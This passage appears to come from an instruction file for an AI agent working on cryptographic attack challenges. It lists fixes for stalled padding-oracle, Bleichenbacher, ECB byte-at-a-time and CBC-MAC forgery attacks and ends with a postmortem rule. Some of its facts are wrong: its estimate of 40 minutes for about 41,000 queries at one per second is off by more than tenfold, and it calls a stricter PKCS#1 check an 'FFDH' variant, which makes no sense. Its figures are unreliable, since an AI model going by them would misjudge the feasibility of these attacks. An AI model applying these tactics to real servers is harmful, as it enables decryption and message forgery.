2. **Oracle rate-limits you below 1 req/s.** Full CBC padding oracle is ~256 · blocks · 16 queries. At 1 Hz with 10 blocks, that's 40 minutes — possibly viable; at 1-per-10-sec it's not. Check for a local oracle interface, WebSocket, or bulk endpoint.
3. **Bleichenbacher won't converge.** You've verified BB98 steps but interval shrinks stall. Usually: the server check is stricter than PKCS#1v1.5 (e.g., also validates an ASN.1 inner structure — "FFDH" variant). Try BB12 or switch to full-plaintext oracle (§7) if available.
4. **ECB byte-at-a-time stalls mid-stream.** Likely hit a PKCS#7 pad boundary — stop and check the recovered plaintext, it's probably complete.
5. **CBC-MAC forgery produces invalid tag.** Protocol likely length-prefixes messages (defeats simple concat forgery). Look for a length-extension variant or reclassify.
6. **Two re-dispatches from orchestrator.** Write `./work/postmortem.md` with what was tried, what the oracle actually returns (copy-paste sample responses), and the specific ambiguity.
